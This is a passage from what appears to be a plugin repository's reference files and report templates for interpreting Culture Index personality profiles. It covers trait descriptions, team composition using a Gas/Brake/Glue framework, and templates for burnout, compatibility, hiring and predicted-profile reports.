settle\n\n</low_logic>\n\n<normative_logic range=\"3-7\">\n\n- Natural EQ - emotionally available but not governed by emotions\n- 3-4: Lead more heart than head, but not disconnected from rational thought\n- 5: Dead smack in the middle\n- 6-7: Lead more head than heart\n\n</normative_logic>\n\n<high_logic range=\"8-10\">\n\n**Characteristics:**\n- Clear thinking when things are hitting the fan\n- Complete separation from emotions; tough situations don't phase them\n\n**Watch:** Can come across cold, detached, insensitive. \"Toughens the dots up.\"\n\n**Combination note:** High B + Logic 10 = outgoing but can say insensitive things (a bit of an \"ahole factor\")\n\n**Combination note:** Low B + Logic 10 = \"sensitivity is not going to be your strong suit\"\n\n</high_logic>\n\n<job_behavior_signal>\n\nWhen a high logic person (9-10) drops their logic in job behaviors (to 4-5), it's almost always an indication of **people-related challenges**. They're trying to be more emotionally open because they've been told they're too cold/detached.\n\n</job_behavior_signal>\n\n</trait>\n\n<trait name=\"I\" color=\"cyan\" label=\"Ingenuity\">\n\nMeasures raw inventiveness and spatial reasoning - how detached from reality someone thinks. \"Clever or original thinking.\"\n\n<important_note>\nI uses **absolute values**. You CAN compare I scores directly between people.\nIngenuity 8 means \"High Ingenuity\" regardless of arrow position.\n</important_note>\n\n<interpretation>\n\n| Score | Label | Behavior |\n|-------|-------|----------|\n| 0-2 | Low Ingenuity | **Most common score**. Linear, practical, grounded. If it doesn't exist, need to touch/see/feel/experience it. |\n| 3-6 | Occasional | Occasional moments of inspiration - looking at things in a more layered, original way. |\n| 7-10 | High Ingenuity | Ingenious, inventive, eccentric, multidimensional thinkers. Detached from reality. |\n\n</interpretation>\n\n<the_pen_test>\n\nAsk what a pen is:\n- Low ingenuity (0-2): \"It's a pen.\"\n- High ingenuity (9): \"It's how we pump oil in Texas. A window into another world. Executive decision-making. A weapon.\"\n- Low ingenuity response to high ingenuity: \"No, moron. It's a freaking pen.\"\n\n</the_pen_test>\n\n<high_ingenuity range=\"7-10\">\n\n**Where it helps:**\n- New business lines and revenue opportunities\n- Creative proposals\n- R&D\n- Creative marketing\n- Don't see limitations - experimental, try unconventional approaches\n\n**Watch for:**\n- Can be distracting with constant weird ideas\n- Not all ideas monetizable - need A trait to commercialize\n- Especially disruptive if in position to initiate ideas\n\n</high_ingenuity>\n\n<low_ingenuity range=\"0-2\">\n\n**Most common score.** Not a negative - indicates practical, grounded thinking.\n\n**Note:** Single-tail IQ correlation. High I  likely high IQ. However, low I does NOT mean low IQ - plenty of certified geniuses have low ingenuity scores.\n\n</low_ingenuity>\n\n<job_behavior_signal>\n\nWhen a low ingenuity person raises their ingenuity in job behaviors, the traditional approach is not working. They're trying to figure out a more inventive way to handle something they're stuck on.\n\n</job_behavior_signal>\n\n</trait>\n\n<confidence_sources>\n\nCulture Index identifies three sources of confidence, each tied to a trait:\n\n| Trait | Confidence Source | Description |\n|-------|-------------------|-------------|\n| High A | Inner self-confidence | Belief in self regardless of circumstances. \"I believe I'll win.\" Can be in a hitting slump and picks themselves up by bootstraps. |\n| High B | Social confidence | Confidence from ability to influence and connect. If people don't respond, starts questioning self. High A + High B can fall back on A's self-confidence. |\n| High D | Knowledge/Expertise confidence | \"If I know it, I know it.\" Confidence rooted in mastery and competency. Great vetters. |\n\n**Confidence recovery:**\n- High A's recover by getting back in the winner's circle (stack easy wins)\n- High B's recover through relationship reconnection\n- High D's recover through acquiring more knowledge/training\n\n</confidence_sources>\n",
        "plugins/culture-index/skills/interpreting-culture-index/references/team-composition.md": "<overview>\n\nEvery team needs the right mix of Gas, Brake, and Glue for its current needs. The ratio depends on the season of business, the function, and current gaps.\n\n</overview>\n\n<gas_brake_glue>\n\n| Role | Trait | Function | Too Little | Too Much |\n|------|-------|----------|------------|----------|\n| **Gas Pedal** | High A | Growth, risk-taking, innovation, driving results | Stagnation, waiting around, no decisive action | Chaos, recklessness, burnout |\n| **Brake Pedal** | High D | Risk aversion, quality control, compliance, finishing | Erosion, mistakes, lawsuits, quality issues | Paralysis, perfectionism, can't ship |\n| **Glue** | High B | Relationships, morale, optimism, \"fun part of the zoo\" | Root canal culture, morale problems, no fun | All talk, no action, groupthink |\n\n</gas_brake_glue>\n\n<diagnostic_questions>\n\n| Symptom | Likely Gap |\n|---------|------------|\n| Lacking growth, decisive action, or strategic problem-solving | Not enough high A (Gas) |\n| Morale sucks, culture feels like a root canal, no fun | Not enough high B (Glue) |\n| Quality erosion, mistakes, compliance issues | Not enough high D (Brake) |\n| Chaos, recklessness, burnout, no follow-through | Too much Gas, not enough Brake |\n| Paralysis, perfectionism, can't ship anything | Too much Brake, not enough Gas |\n| All talk, no action, groupthink, avoiding hard decisions | Too much Glue, not enough Gas |\n\n</diagnostic_questions>\n\n<business_season>\n\nThe ideal balance depends on what the team/company needs now:\n\n| Season | Priority | What You Need |\n|--------|----------|---------------|\n| **High-growth / Turnaround** | Gas | Drivers and risk-takers. High A's who will push through. |\n| **Consolidation / Stability** | Brake | Quality and consistency. High D's who ensure nothing breaks. |\n| **Culture Building** | Glue | Relationship builders. High B's who create positive environment. |\n| **Complex Operations** | Brake + Glue | Precision and collaboration. Need both quality control and team cohesion. |\n| **Innovation / R&D** | Gas + Low D | Risk-takers who experiment. High A + Low D = willingness to fail fast. |\n| **Compliance-Heavy** | Brake | High D's who follow rules precisely. Risk aversion is a feature. |\n\n</business_season>\n\n<function_needs>\n\nDifferent functions naturally need different balances:\n\n| Function | Primary Need | Why |\n|----------|-------------|-----|\n| Sales | Gas (High A) | Drive results, close deals, push through objections |\n| Engineering | Brake (High D) | Quality code, attention to detail, systematic approach |\n| Customer Success | Glue (High B) | Relationships, retention, advocacy |\n| Operations | Brake (High D) | Consistency, reliability, process adherence |\n| Marketing (Creative) | Gas + Low D | Innovation, experimentation, bold ideas |\n| Finance | Brake (High D) | Accuracy, compliance, risk management |\n| HR | Glue (High B) | Culture, relationships, employee advocacy |\n| Executive Team | Balanced | Need all three: drive (Gas), quality (Brake), culture (Glue) |\n\n</function_needs>\n\n<c_trait_team_impact>\n\nC (Pace/Patience) affects team dynamics beyond Gas/Brake/Glue:\n\n| Team Pattern | Implication |\n|--------------|-------------|\n| Mostly Low C | Fast-moving, urgent, may create unnecessary chaos. Need someone to slow things down occasionally. |\n| Mostly High C | Steady, patient, but may resist change. Need someone to push urgency when required. |\n| Mixed C | Natural tension between fast and slow movers. Can be healthy friction if managed. |\n\n**Considerations:**\n- If major projects require urgent pivots  need some Low C\n- If major projects require sustained focus  need some High C\n- Pairing Low C with High C can create complementary partnerships (one pushes, one steadies)\n\n</c_trait_team_impact>\n\n<a_vs_b_team_balance>\n\nTeam-wide task vs people orientation:\n\n| Pattern | Implication |\n|---------|-------------|\n| A > B (most people) | Task-focused, results-driven. May neglect relationships and culture. Risk of burnout and turnover. |\n| B > A (most people) | People-focused, harmonious. May avoid tough decisions and underperform on results. |\n| Mixed A/B | Healthy tension. Task drivers balanced by relationship builders. |\n\n</a_vs_b_team_balance>\n\n<hiring_to_fill_gaps>\n\nWhen hiring to fill a gap, specify the ideal profile:\n\n**Gap: Not enough Gas**\n```\nIdeal Hire Pattern:\n- A: High (right of arrow) - drives results, takes initiative\n- B: Any (based on role) - depends on whether role is people-facing\n- C: Low preferred - urgency and pace\n- D: Any (consider existing Brake capacity)\n```\n\n**Gap: Not enough Brake**\n```\nIdeal Hire Pattern:\n- A: Any - Low A + High D = specialist optimizer\n- B: Any (based on role)\n- C: High preferred - patience for detailed work\n- D: High (right of arrow) - quality focus, follow-through\n```\n\n**Gap: Not enough Glue**\n```\nIdeal Hire Pattern:\n- A: Any - Low A + High B = collaborative culture builder\n- B: High (right of arrow) - relationship builder\n- C: Any (based on role pace)\n- D: Any\n```\n\n</hiring_to_fill_gaps>\n\n<conflict_pairs>\n\nTrait combinations that create friction on teams:\n\n| Combination | Friction Point | Mitigation |\n|-------------|----------------|------------|\n| High A vs High A | Power struggles, both want to lead | Clear role delineation, separate domains |\n| High A vs Low A | Independence vs collaboration | High A provides direction, respects Low A's process |\n| High B vs Low B | Social needs mismatch | High B allows Low B alone time; Low B participates minimally |\n| High C vs Low C | Pace/urgency mismatch | Low C respects focus time; High C accepts some urgency |\n| High D vs Low D | Detail orientation clash | High D accepts \"good enough\"; Low D follows through |\n| High D vs High D | Both perfectionist, both critical | Can be excellent partnership if aligned on standards |\n\n</conflict_pairs>\n\n<remote_team_considerations>\n\nFor remote/distributed teams:\n\n- **Glue is even more critical** - Without casual office interactions, High B's are essential for maintaining culture\n- **Low B's thrive** - Remote work is natural for those who prefer isolation\n- **Low C's may struggle** - Harder to get immediate responses, may feel urgency isn't matched\n- **High D's need clear processes** - More documentation, explicit SOPs for remote work\n\n</remote_team_considerations>\n",
        "plugins/culture-index/skills/interpreting-culture-index/templates/burnout-report.md": "# Burnout Detection Report Template\n\nCopy and fill this template when analyzing burnout risk using Culture Index Survey vs Job comparison.\n\n---\n\n## Burnout Risk Assessment: [Name]\n\n**Date:** [Date]\n**Data Source:** [PDF/JSON]\n**Pattern:** [Archetype]\n\n### Energy Utilization\n\n| Metric | Value |\n|--------|-------|\n| Survey EU | [value] |\n| Job EU | [value] |\n| **Utilization** | **[Job/Survey  100]%** |\n\n### Status Classification\n\n| Range | Status | This Person |\n|-------|--------|-------------|\n| 70-130% | Healthy | [ ] |\n| >130% | **STRESS** (burnout risk) | [ ] |\n| <70% | **FRUSTRATION** (flight risk) | [ ] |\n\n**Current Status:** [Healthy/Stress/Frustration]\n\n### Arrow Movement\n\n| Graph | Arrow Position | Delta |\n|-------|----------------|-------|\n| Survey | [value] | - |\n| Job | [value] | [X] |\n\n**Interpretation:** [Arrow moved right = stress / Arrow moved left = frustration / No movement = stable]\n\n### Trait Modification Analysis\n\n| Trait | Survey | Job | Change | Interpretation |\n|-------|--------|-----|--------|----------------|\n| A | [pos from arrow] | [pos from arrow] | [X] | [meaning] |\n| B | [pos from arrow] | [pos from arrow] | [X] | [meaning] |\n| C | [pos from arrow] | [pos from arrow] | [X] | [meaning] |\n| D | [pos from arrow] | [pos from arrow] | [X] | [meaning] |\n\n### Most Significant Modifications\n\n1. **[Trait]:** [Survey pos]  [Job pos] ([interpretation])\n2. **[Trait]:** [Survey pos]  [Job pos] ([interpretation])\n\n### Red Flags Detected\n\n| Signal | Present | Details |\n|--------|---------|---------|\n| EU 0-10 (avoidant) | [Y/N] | [details] |\n| All dots flipped sides | [Y/N] | [details] |\n| D raised significantly | [Y/N] | [details] |\n| Arrow shifted >2 positions | [Y/N] | [details] |\n| Utilization >150% | [Y/N] | [details] |\n| Utilization <50% | [Y/N] | [details] |\n\n### Risk Assessment\n\n| Factor | Finding | Risk Level |\n|--------|---------|------------|\n| EU Utilization | [%] | [Low/Medium/High/Critical] |\n| Trait Modifications | [summary] | [Low/Medium/High/Critical] |\n| Arrow Movement | [summary] | [Low/Medium/High/Critical] |\n| **Overall Risk** | - | **[Low/Medium/High/Critical]** |\n\n### Root Cause Hypothesis\n\nBased on the modification pattern, likely causes include:\n\n1. **[Cause 1]:** [explanation based on specific trait changes]\n2. **[Cause 2]:** [explanation based on specific trait changes]\n\n### Recommended Actions\n\n**Immediate (if High/Critical):**\n- [ ] [Immediate action]\n- [ ] [Immediate action]\n\n**Short-term:**\n- [ ] [Short-term action]\n- [ ] [Short-term action]\n\n**Ongoing:**\n- [ ] [Ongoing monitoring action]\n\n### Questions to Explore\n\n1. [Question to ask in 1:1 based on modifications]\n2. [Question to ask in 1:1 based on modifications]\n3. [Question to ask in 1:1 based on modifications]\n\n### Resurvey Recommendation\n\n| Current Risk | Resurvey In |\n|--------------|-------------|\n| Low | 6 months |\n| Medium | 3 months |\n| High | 1-2 months |\n| Critical | After intervention |\n\n**Next resurvey:** [Date]\n\n---\n\n*Burnout analysis based on Survey vs Job comparison. Survey = hardwired traits; Job = adaptive behaviors. Sustained behavior modification drains energy. This assessment is one input - combine with direct conversation and observation.*\n",
        "plugins/culture-index/skills/interpreting-culture-index/templates/comparison-report.md": "# Profile Comparison Report Template\n\nCopy and fill this template when comparing two Culture Index profiles for compatibility analysis.\n\n---\n\n## Profile Comparison: [Person A] & [Person B]\n\n**Date:** [Date]\n**Relationship:** [Peers / Manager-Report / Cross-functional / etc.]\n\n### Profile Overview\n\n| Trait | Person A | Person B | Gap | Same Side? |\n|-------|----------|----------|-----|------------|\n| Pattern | [Archetype] | [Archetype] | - | - |\n| A | [X from arrow] | [X from arrow] | [diff] | [Y/N] |\n| B | [X from arrow] | [X from arrow] | [diff] | [Y/N] |\n| C | [X from arrow] | [X from arrow] | [diff] | [Y/N] |\n| D | [X from arrow] | [X from arrow] | [diff] | [Y/N] |\n| L | [absolute] | [absolute] | [diff] | - |\n| I | [absolute] | [absolute] | [diff] | - |\n\n### Compatibility Assessment\n\n| Factor | Score | Notes |\n|--------|-------|-------|\n| Overall Pattern Match | [High/Medium/Low] | [patterns similar or complementary?] |\n| A Alignment | [High/Medium/Low] | [collaboration vs independence] |\n| B Alignment | [High/Medium/Low] | [social energy match] |\n| C Alignment | [High/Medium/Low] | [pace match] |\n| D Alignment | [High/Medium/Low] | [detail orientation match] |\n\n### Primary Friction Points\n\n| Trait Gap | Person A Tendency | Person B Tendency | Friction |\n|-----------|-------------------|-------------------|----------|\n| [Trait] | [behavior] | [behavior] | [friction description] |\n| [Trait] | [behavior] | [behavior] | [friction description] |\n\n### Primary Alignment Points\n\n| Trait | Person A | Person B | Alignment |\n|-------|----------|----------|-----------|\n| [Trait] | [behavior] | [behavior] | [why compatible] |\n| [Trait] | [behavior] | [behavior] | [why compatible] |\n\n### How They Likely See Each Other\n\n**Person A sees Person B as:**\n- [Perception based on trait gap]\n- [Perception based on trait gap]\n\n**Person B sees Person A as:**\n- [Perception based on trait gap]\n- [Perception based on trait gap]\n\n### Collaboration Recommendations\n\n**For [Person A]:**\n1. [Adjustment to make when working with Person B]\n2. [Adjustment to make when working with Person B]\n\n**For [Person B]:**\n1. [Adjustment to make when working with Person A]\n2. [Adjustment to make when working with Person A]\n\n**Process/Environment Changes:**\n1. [Process change to reduce friction]\n2. [Process change to reduce friction]\n\n### Optimal Working Arrangement\n\n| Aspect | Recommendation | Why |\n|--------|----------------|-----|\n| Meeting frequency | [recommendation] | [based on C and B traits] |\n| Communication channel | [recommendation] | [based on B traits] |\n| Decision-making | [recommendation] | [based on A traits] |\n| Quality review | [recommendation] | [based on D traits] |\n\n### Complementary Strengths\n\nWhen paired effectively, this combination can:\n1. [Complementary strength 1]\n2. [Complementary strength 2]\n\n### Watch Areas\n\nWhen stressed or misaligned:\n1. [Potential breakdown area]\n2. [Potential breakdown area]\n\n### Summary\n\n**Overall Compatibility:** [High/Medium/Low]\n\n**Key Takeaway:** [1-2 sentence summary of the relationship dynamics]\n\n**Action Required:** [None/Process adjustment/Active management/Intervention]\n\n---\n\n*Compatibility analysis based on trait gap assessment. Opposite traits create friction but also complementary strengths. Same-side traits create easy rapport but potential blind spots.*\n",
        "plugins/culture-index/skills/interpreting-culture-index/templates/hiring-profile.md": "# Hiring Profile Template\n\nCopy and fill this template when defining the ideal Culture Index profile for a role.\n\n---\n\n## Hiring Profile: [Role Title]\n\n**Date Created:** [Date]\n**Created By:** [Name]\n**Department:** [Department]\n\n### Role Context\n\n| Factor | Detail |\n|--------|--------|\n| Reports to | [Manager name and pattern, if known] |\n| Team size | [Current team size] |\n| Business stage | [Growth / Consolidation / Turnaround / Stability] |\n| Remote/Office | [Remote / Hybrid / Office] |\n\n### Role Requirements Analysis\n\n**Role-Fit Questions:**\n\n| Question | Answer | Trait Implication |\n|----------|--------|-------------------|\n| Is this role more macro or micro? | [answer] | A: [High/Low/Norm] |\n| Is this role about people or problems? | [answer] | B: [High/Low/Norm] |\n| How much repetition is in this role? | [answer] | C: [High/Low/Norm] |\n| Does this role require strict process? | [answer] | D: [High/Low/Norm] |\n| Does success require analytical detachment? | [answer] | L: [range or any] |\n| Does success require novel problem-solving? | [answer] | I: [range or any] |\n\n### Ideal Profile\n\n| Trait | Position | Confidence | Rationale |\n|-------|----------|------------|-----------|\n| A (Autonomy) | [High/Low/Norm] | [H/M/L] | [why this position] |\n| B (Social) | [High/Low/Norm] | [H/M/L] | [why this position] |\n| C (Pace) | [High/Low/Norm] | [H/M/L] | [why this position] |\n| D (Conformity) | [High/Low/Norm] | [H/M/L] | [why this position] |\n| L (Logic) | [range or any] | [H/M/L] | [why this range] |\n| I (Ingenuity) | [range or any] | [H/M/L] | [why this range] |\n\n**Target Pattern:** [Pattern name]\n\n### Acceptable Variations\n\n| Pattern | Acceptability | Notes |\n|---------|---------------|-------|\n| [Ideal pattern] | Ideal | [notes] |\n| [Alternative 1] | Acceptable | [why acceptable] |\n| [Alternative 2] | Acceptable | [why acceptable] |\n| [Alternative 3] | Marginal | [trade-offs] |\n\n### Acceptable Trait Ranges\n\n| Trait | Ideal | Acceptable | Hard No |\n|-------|-------|------------|---------|\n| A | [pos] | [range] | [extremes to avoid] |\n| B | [pos] | [range] | [extremes to avoid] |\n| C | [pos] | [range] | [extremes to avoid] |\n| D | [pos] | [range] | [extremes to avoid] |\n\n### Red Flags (Do Not Hire)\n\n| Red Flag | Why Problematic for This Role |\n|----------|-------------------------------|\n| [Pattern or trait] | [specific reason] |\n| [Pattern or trait] | [specific reason] |\n| [Pattern or trait] | [specific reason] |\n\n### Team Fit Considerations\n\n**Current team composition:**\n- Gas (High A): [count] people\n- Brake (High D): [count] people\n- Glue (High B): [count] people\n\n**This hire should add:**\n- [ ] Gas (if lacking growth drivers)\n- [ ] Brake (if lacking quality control)\n- [ ] Glue (if lacking culture builders)\n- [ ] Diversity (if team is too homogeneous)\n\n### Manager Compatibility\n\nManager: [Name] - [Pattern]\n\n| Manager Trait | Ideal Hire Trait | Compatibility Notes |\n|---------------|------------------|---------------------|\n| [Manager A] | [Ideal A] | [alignment or friction] |\n| [Manager B] | [Ideal B] | [alignment or friction] |\n| [Manager C] | [Ideal C] | [alignment or friction] |\n| [Manager D] | [Ideal D] | [alignment or friction] |\n\n### Interview Focus Areas\n\nBased on ideal profile, explore these areas during interviews:\n\n1. **[Trait]:** [What to probe for]\n2. **[Trait]:** [What to probe for]\n3. **[Trait]:** [What to probe for]\n\n### Using This Profile\n\n**With predicted traits (from interview transcript):**\n- Compare predicted profile to this template\n- Note alignment and concerns\n- Flag any red flag traits\n\n**With actual CI survey (after offer signed):**\n- Compare actual survey to predictions\n- Verify fit against this profile\n- Identify onboarding adjustments if needed\n\n### Approval\n\n| Role | Name | Date |\n|------|------|------|\n| Hiring Manager | [Name] | [Date] |\n| HR/People Ops | [Name] | [Date] |\n\n---\n\n*Hiring profiles define ideal traits, not rigid requirements. CI is one input - combine with skills assessment, experience review, and culture interview.*\n",
        "plugins/culture-index/skills/interpreting-culture-index/templates/individual-report.md": "# Individual Profile Report Template\n\nCopy and fill this template when reporting on an individual's Culture Index profile.\n\n---\n\n## [Name] - [Archetype/Pattern]\n\n**Date:** [Date]\n**Data Source:** [PDF/JSON]\n\n### Profile Summary\n\n| Trait | Position | Distance from Arrow | Interpretation |\n|-------|----------|---------------------|----------------|\n| A (Autonomy) | [value] | [X centiles] | [High/Low/Normative] |\n| B (Social) | [value] | [X centiles] | [High/Low/Normative] |\n| C (Pace) | [value] | [X centiles] | [High/Low/Normative] |\n| D (Conformity) | [value] | [X centiles] | [High/Low/Normative] |\n| L (Logic) | [value] | n/a | [High/Normative/Low - absolute] |\n| I (Ingenuity) | [value] | n/a | [High/Moderate/Low - absolute] |\n\n**Arrow Position:** [value]\n**EU (Survey):** [value]\n**EU (Job):** [value] *(if available)*\n\n### Leading Traits\n\n1. **[Trait]** at [X centiles] - [interpretation]\n2. **[Trait]** at [X centiles] - [interpretation]\n3. **[Trait]** at [X centiles] - [interpretation]\n\n### Strengths\n\n1. [Strength based on leading traits]\n2. [Strength based on leading traits]\n3. [Strength based on leading traits]\n\n### Challenges / Development Areas\n\n1. [Challenge based on leading traits]\n2. [Challenge based on leading traits]\n\n### Energy Status\n\n| Metric | Value | Status |\n|--------|-------|--------|\n| Survey EU | [value] | - |\n| Job EU | [value] | - |\n| Utilization | [Job/Survey  100]% | [Healthy/Stress/Frustration] |\n\n*(If Job behaviors unavailable, note \"Single survey only - no utilization comparison available\")*\n\n### Survey vs Job Comparison\n\n*(Complete this section only if both graphs are available)*\n\n| Trait | Survey | Job | Change | Interpretation |\n|-------|--------|-----|--------|----------------|\n| A | [pos] | [pos] | [diff] | [meaning] |\n| B | [pos] | [pos] | [diff] | [meaning] |\n| C | [pos] | [pos] | [diff] | [meaning] |\n| D | [pos] | [pos] | [diff] | [meaning] |\n\n**Arrow Movement:** [Survey arrow]  [Job arrow]\n\n### Recommendations\n\n1. [Actionable recommendation based on profile]\n2. [Actionable recommendation based on profile]\n\n### Communication Preferences\n\n- **Best way to communicate:** [based on traits]\n- **Feedback approach:** [based on A and D]\n- **Meeting style:** [based on B and C]\n\n### Notes\n\n- [Any additional observations]\n- Culture Index is one data point - combine with skills, experience, and performance data\n\n---\n\n*Interpretation follows Culture Index methodology. All trait positions are relative to the population mean (arrow). No trait is inherently \"good\" or \"bad\" - fit depends on role and context.*\n",
        "plugins/culture-index/skills/interpreting-culture-index/templates/predicted-profile.md": "# Predicted Profile Template\n\nCopy and fill this template when predicting Culture Index traits from interview transcripts.\n\n---\n\n## Predicted Culture Index Profile: [Candidate Name]\n\n**Analysis Date:** [Date]\n**Analyzed By:** [Name/Claude]\n**Overall Confidence:** [High/Medium/Low]\n\n### Transcript Sources\n\n| Interview | Duration | Interviewer(s) | Topics Covered |\n|-----------|----------|----------------|----------------|\n| [Type] | [mins] | [Names] | [Topics] |\n| [Type] | [mins] | [Names] | [Topics] |\n\n**Total Interview Data:** [X] minutes across [Y] interviews\n\n### Trait Predictions\n\n| Trait | Predicted Position | Confidence | Key Evidence |\n|-------|-------------------|------------|--------------|\n| A (Autonomy) | [High/Low/Norm] | [H/M/L] | \"[Supporting quote]\" |\n| B (Social) | [High/Low/Norm] | [H/M/L] | \"[Supporting quote]\" |\n| C (Pace) | [High/Low/Norm] | [H/M/L] | \"[Supporting quote]\" |\n| D (Conformity) | [High/Low/Norm] | [H/M/L] | \"[Supporting quote]\" |\n| L (Logic) | [0-10 estimate] | [H/M/L] | \"[Supporting quote]\" |\n| I (Ingenuity) | [0-10 estimate] | [H/M/L] | \"[Supporting quote]\" |\n\n### Predicted Pattern\n\n**Pattern:** [Pattern name, if identifiable]\n\n**Confidence:** [High/Medium/Low/Insufficient data]\n\n**Pattern Description:** [1-2 sentence description of what this pattern means]\n\n### Strongest Signals\n\nThese predictions have the highest confidence:\n\n1. **[Trait]:** [Evidence summary]\n   - Quote: \"[Direct quote from transcript]\"\n   - Context: [What prompted this response]\n\n2. **[Trait]:** [Evidence summary]\n   - Quote: \"[Direct quote from transcript]\"\n   - Context: [What prompted this response]\n\n### Uncertainty Areas\n\nThese predictions have lower confidence and should be verified:\n\n| Trait | Prediction | Why Uncertain |\n|-------|------------|---------------|\n| [Trait] | [prediction] | [Limited data / mixed signals / interview context] |\n| [Trait] | [prediction] | [Limited data / mixed signals / interview context] |\n\n### Evidence Analysis by Trait\n\n#### A (Autonomy) Analysis\n\n| Signal Type | High A Evidence | Low A Evidence |\n|-------------|-----------------|----------------|\n| Pronouns | [I vs We usage] | [I vs We usage] |\n| Credit | [Takes/deflects] | [Takes/deflects] |\n| Initiative | [Examples] | [Examples] |\n| Questions | [Reframes/clarifies] | [Reframes/clarifies] |\n\n**A Prediction:** [High/Low/Norm] at [confidence]\n\n#### B (Social) Analysis\n\n| Signal Type | High B Evidence | Low B Evidence |\n|-------------|-----------------|----------------|\n| Rapport | [Examples] | [Examples] |\n| Stories | [People/task focus] | [People/task focus] |\n| Verbosity | [Verbose/brief] | [Verbose/brief] |\n| Energy | [Animated/reserved] | [Animated/reserved] |\n\n**B Prediction:** [High/Low/Norm] at [confidence]\n\n#### C (Pace) Analysis\n\n| Signal Type | High C Evidence | Low C Evidence |\n|-------------|-----------------|----------------|\n| Response speed | [Examples] | [Examples] |\n| Structure | [Methodical/jumps] | [Methodical/jumps] |\n| Ambiguity | [Clarifies/comfortable] | [Clarifies/comfortable] |\n| Change | [Prefers stability/pivots] | [Prefers stability/pivots] |\n\n**C Prediction:** [High/Low/Norm] at [confidence]\n\n#### D (Conformity) Analysis\n\n| Signal Type | High D Evidence | Low D Evidence |\n|-------------|-----------------|----------------|\n| Precision | [Specific/approximate] | [Specific/approximate] |\n| Process | [Rules/creative] | [Rules/creative] |\n| Answers | [Structured/flowing] | [Structured/flowing] |\n| Standards | [References quality] | [References outcomes] |\n\n**D Prediction:** [High/Low/Norm] at [confidence]\n\n### Interview Context Factors\n\nFactors that may have affected the interview behavior:\n\n| Factor | Impact | Adjustment |\n|--------|--------|------------|\n| Interview stress | [High/Medium/Low] | [How it may have affected] |\n| Performance mode | [Detected/Not detected] | [How it may have affected] |\n| Topic coverage | [Comprehensive/Limited] | [Gaps in assessment] |\n| Interviewer style | [Note any impacts] | [How it may have affected] |\n\n### Comparison to Role Profile\n\n*(If hiring profile exists)*\n\n| Trait | Predicted | Required | Match |\n|-------|-----------|----------|-------|\n| A | [pred] | [req] | [Y/N/~] |\n| B | [pred] | [req] | [Y/N/~] |\n| C | [pred] | [req] | [Y/N/~] |\n| D | [pred] | [req] | [Y/N/~] |\n\n**Overall Role Fit:** [Strong/Moderate/Weak]\n\n### Red Flag Check\n\n| Red Flag for Role | Predicted Trait | Hit? |\n|-------------------|-----------------|------|\n| [Red flag 1] | [prediction] | [Y/N] |\n| [Red flag 2] | [prediction] | [Y/N] |\n\n### Recommended Next Steps\n\nBased on this predicted profile:\n\n1. [ ] [Next step based on predictions]\n2. [ ] [Next step based on predictions]\n3. [ ] [Next step based on predictions]\n\n### Areas to Verify with Actual CI\n\nWhen the actual Culture Index survey is administered after offer acceptance, pay special attention to:\n\n1. **[Trait]:** Predicted [position] at [confidence] - verify this prediction\n2. **[Trait]:** [Specific uncertainty to verify]\n3. **[Any trait critical for role fit]**\n\n### Important Caveats\n\n- **This is a prediction, not a diagnosis.** Interview behavior may differ from natural behavior.\n- **Interview stress affects presentation.** Some traits may be masked or amplified.\n- **Actual CI survey will be administered** after offer is signed and before start date.\n- **Use for preliminary assessment only.** Do not treat predictions as definitive.\n- **Technical skills, experience, and culture fit** still matter independently of CI.\n\n---\n\n*Prediction methodology based on interview-trait-signals reference. Confidence levels: High = consistent signals across multiple questions; Medium = some supporting evidence; Low = limited data or mixed signals.*\n",
        "plugins/culture-index/skills/interpreting-culture-index/templates/team-report.md": "# Team Composition Report Template\n\nCopy and fill this template when analyzing team composition using Culture Index profiles.\n\n---\n\n## Team Composition Analysis: [Team Name]\n\n**Date:** [Date]\n**Team Size:** [X] members\n**Business Stage:** [Growth/Consolidation/Turnaround/Stability]\n\n### Team Roster\n\n| Name | Pattern | A | B | C | D | Primary Role | EU Status |\n|------|---------|---|---|---|---|--------------|-----------|\n| [Name] | [Pattern] | [pos] | [pos] | [pos] | [pos] | [Gas/Brake/Glue] | [Healthy/Stress/Frustration] |\n| [Name] | [Pattern] | [pos] | [pos] | [pos] | [pos] | [Gas/Brake/Glue] | [Healthy/Stress/Frustration] |\n| [Name] | [Pattern] | [pos] | [pos] | [pos] | [pos] | [Gas/Brake/Glue] | [Healthy/Stress/Frustration] |\n\n### Gas / Brake / Glue Balance\n\n| Role | Count | Members | Assessment |\n|------|-------|---------|------------|\n| **Gas** (High A) | [X] | [Names] | [Sufficient/Insufficient/Excess] |\n| **Brake** (High D) | [X] | [Names] | [Sufficient/Insufficient/Excess] |\n| **Glue** (High B) | [X] | [Names] | [Sufficient/Insufficient/Excess] |\n\n### Balance Assessment\n\n**Current state:**\n- Gas (High A): [count] - [assessment]\n- Brake (High D): [count] - [assessment]\n- Glue (High B): [count] - [assessment]\n\n**For [Business Stage], the team needs:**\n- [More/Less/Same] Gas\n- [More/Less/Same] Brake\n- [More/Less/Same] Glue\n\n### Identified Gaps\n\n| Gap | Impact | Priority |\n|-----|--------|----------|\n| [Gap 1] | [Impact description] | [High/Medium/Low] |\n| [Gap 2] | [Impact description] | [High/Medium/Low] |\n\n### C Trait Distribution\n\n| Pattern | Count | Implication |\n|---------|-------|-------------|\n| Low C (Fast-paced) | [X] | [implication] |\n| High C (Steady) | [X] | [implication] |\n| Normative C | [X] | [implication] |\n\n**Assessment:** [Team is mostly fast/steady/mixed - implications]\n\n### A vs B Balance\n\n| Orientation | Count | Members |\n|-------------|-------|---------|\n| A > B (Task-focused) | [X] | [Names] |\n| B > A (People-focused) | [X] | [Names] |\n| A  B (Balanced) | [X] | [Names] |\n\n**Assessment:** [Team is task/people/balanced - implications]\n\n### Potential Friction Points\n\n| Person A | Person B | Friction Source | Risk Level |\n|----------|----------|-----------------|------------|\n| [Name] | [Name] | [trait mismatch] | [High/Medium/Low] |\n| [Name] | [Name] | [trait mismatch] | [High/Medium/Low] |\n\n### Hiring Recommendations\n\n*(If gaps exist)*\n\n**Gap 1: [Gap description]**\n- Ideal Pattern: [Pattern name]\n- A: [High/Low/Normative] - [reason]\n- B: [High/Low/Normative] - [reason]\n- C: [High/Low/Normative] - [reason]\n- D: [High/Low/Normative] - [reason]\n\n### Team Strengths\n\n1. [Strength 1]\n2. [Strength 2]\n3. [Strength 3]\n\n### Watch Areas\n\n1. [Risk or watch area 1]\n2. [Risk or watch area 2]\n\n### Energy Status Overview\n\n| Status | Count | Members |\n|--------|-------|---------|\n| Healthy (70-130%) | [X] | [Names] |\n| Stress (>130%) | [X] | [Names] |\n| Frustration (<70%) | [X] | [Names] |\n\n**Team health:** [Overall assessment]\n\n---\n\n*Analysis uses Gas/Brake/Glue framework. Trait positions are relative to each person's arrow. Team composition 